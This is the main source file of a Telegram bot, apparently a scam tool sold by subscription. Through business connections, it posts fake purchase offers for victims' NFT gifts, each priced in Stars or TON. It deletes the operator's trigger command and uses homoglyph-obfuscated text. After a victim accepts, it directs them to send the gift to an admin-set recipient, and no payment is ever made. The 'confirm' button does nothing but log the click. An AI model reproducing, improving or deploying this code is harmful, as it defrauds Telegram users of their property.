# main.py
import os
import asyncio
import re
import random
import string
import logging

from dotenv import load_dotenv

# ⬇️⬇️⬇️ ВОТ ЭТО ГЛАВНОЕ ИЗМЕНЕНИЕ: load_dotenv() вызывается ДО импорта admin
load_dotenv()

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions,
)
from aiogram.exceptions import TelegramBadRequest

from admin import (
    router as admin_router, has_access, ADMIN_ID,
    get_recipient, is_enabled, bump_stat,
)
from ton_watcher import start_watcher

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN", "")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
dp.include_router(admin_router)

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}

E_GEM, E_OK, E_NO, E_TIMER, E_GIFT, E_STAR, E_WARN, E_CHECK, E_LOCK = (
    "5318901904686754959", "5774022692642492953", "5774077015388852135",
    "6037268453759389862", "5773677501825945508", "6028338546736107668",
    "6030563507299160824", "5774022692642492953", "5774077015388852135",
)


def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None
    first = parts[0].lstrip("./").lower()
    if first == "buy":
        parts = parts[1:]
    if not parts:
        return None

    link, amount = None, None
    currency, lang = "STARS", "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me")):
            link = p
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low in ("gram", "гр", "грам"):
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = int(float(p.replace(",", ".")))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num


def amount_line(amount, currency):
    if currency == "GRAM":
        return f'{amount} {em(E_GEM, "💎")}'
    return f'{amount} {em(E_STAR, "⭐")}'


def build_offer_text(amount, currency, gift_name, gift_num, order_id, url):
    return (
        f'{em(E_GIFT, "🎁")} Пoльзoвaтeль пpeдлaгaeт вaм\n'
        f'{amount_line(amount, currency)} зa пoдapoк '
        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
        f'{em(E_TIMER, "⏱")} Oффeр дeйcтвитeлeн eщё 6 ч. 0 мин. 0 ceк.\n'
        f'{em(E_LOCK, "🔒")} Cдeлкa фикcиpуeтcя кнoпкoй «Принять».\n\n'
        f'<i>Oффeр #{order_id}</i>'
    )


def build_accept_text(amount, currency, gift_name, gift_num, order_id, nft_url):
    recipient = get_recipient()
    return (
        f'{em(E_CHECK, "✅")} <b>Oффeр пpинят</b>\n\n'
        f'{em(E_GIFT, "🎁")} Пepeдaйтe пoдapoк '
        f'<b><a href="{nft_url}">{gift_name} #{gift_num}</a></b>\n'
        f'пoльзoвaтeлю <b>@{recipient}</b>.\n\n'
        f'{amount_line(amount, currency)} зa пoдapoк {gift_name} #{gift_num}.\n\n'
        f'<i>Oффeр #{order_id}, пoлучaтeль @{recipient}</i>'
    )


def make_offer_keyboard(order_id):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Oтклoнить", callback_data=f"decl|{order_id}", icon_custom_emoji_id=E_NO),
        InlineKeyboardButton(text="Принять", callback_data=f"acc|{order_id}", icon_custom_emoji_id=E_OK),
    ]])


def make_accept_keyboard(nft_url):
    recipient = get_recipient()
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="Пepeдaть пoдapoк",
            url=f"tg://send_gift?to={recipient}",
            icon_custom_emoji_id=E_GIFT,
        )],
        [InlineKeyboardButton(text="Oткpыть пoдapoк", url=nft_url)],
        [InlineKeyboardButton(
            text="Пoдтвepдить пepeдaчу",
            callback_data="confirm",
            icon_custom_emoji_id=E_CHECK,
        )],
    ])


def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


OFFERS = {}


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    if not is_enabled():
        return
    bcid = message.business_connection_id
    if not bcid or not message.from_user:
        return
    if not has_access(message.from_user.id, message.from_user.username) and message.from_user.id != ADMIN_ID:
        return
    parsed = parse_command(message.text or "")
    if not parsed:
        return
    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num = gift

    slug = gift_name.replace(" ", "")
    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()
    OFFERS[order_id] = (amount, currency, gift_name, gift_num, nft_url)
    bump_stat("created")

    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_text(amount, currency, gift_name, gift_num, order_id, nft_url),
            reply_markup=make_offer_keyboard(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False, prefer_large_media=True, show_above_text=False,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"send: {e}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid, message_ids=[message.message_id]
        )
    except Exception as e:
        logging.error(f"del: {e}")


@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not message.from_user:
        return
    if not has_access(message.from_user.id, message.from_user.username) and message.from_user.id != ADMIN_ID:
        await message.answer(
            "Нет доступа.\n\n"
            "💎 Купить доступ на 30 дней: /subscribe\n"
            "📅 Проверить доступ: /myaccess"
        )
        return
    await message.answer(
        "🎁 <b>Как пользоваться</b>\n\n"
        "<code>.buy ссылка сумма stars/gram язык</code>\n\n"
        "<b>Примеры:</b>\n"
        "<code>.buy https://t.me/nft/CupidCharm-22645 999999 stars ru</code>\n"
        "<code>.buy https://t.me/nft/PreciousPeach-664 500 gram ukr</code>\n\n"
        "<b>Языки:</b> ru, ukr, eng, cn\n"
        "<b>Валюта:</b> stars или gram\n\n"
        "📅 Мой доступ: /myaccess\n"
        "🛠 Админ: /admin"
    )


@dp.callback_query(F.data.startswith("acc|"))
async def accept(cb: CallbackQuery):
    if not cb.message:
        await cb.answer("Устарело", show_alert=True)
        return
    order_id = cb.data.split("|")[1]
    data = OFFERS.get(order_id)
    if not data:
        await cb.answer("Оффер устарел", show_alert=True)
        return
    amount, currency, gift_name, gift_num, nft_url = data
    bump_stat("accepted")
    try:
        await cb.message.edit_text(
            text=build_accept_text(amount, currency, gift_name, gift_num, order_id, nft_url),
            reply_markup=make_accept_keyboard(nft_url),
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            logging.error(f"accept: {e}")
            await cb.answer("Не удалось обновить", show_alert=True)
            return
    await cb.answer()


@dp.callback_query(F.data.startswith("decl|"))
async def decline(cb: CallbackQuery):
    if not cb.message:
        await cb.answer("Устарело", show_alert=True)
        return
    bump_stat("declined")
    try:
        await cb.message.edit_text(
            text=f'{em(E_NO, "❌")} Oффeр был oтклoнён.',
            reply_markup=None,
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e):
            logging.error(f"decline: {e}")
    await cb.answer()


@dp.callback_query(F.data == "confirm")
async def confirm(cb: CallbackQuery):
    if not cb.from_user:
        await cb.answer()
        return
    logging.info(f"Подтверждение передачи от {cb.from_user.id}")
    await cb.answer("✅ Передача подтверждена", show_alert=True)


async def main():
    start_watcher(bot)

    await dp.start_polling(
        bot,
        allowed_updates=[
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "message",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
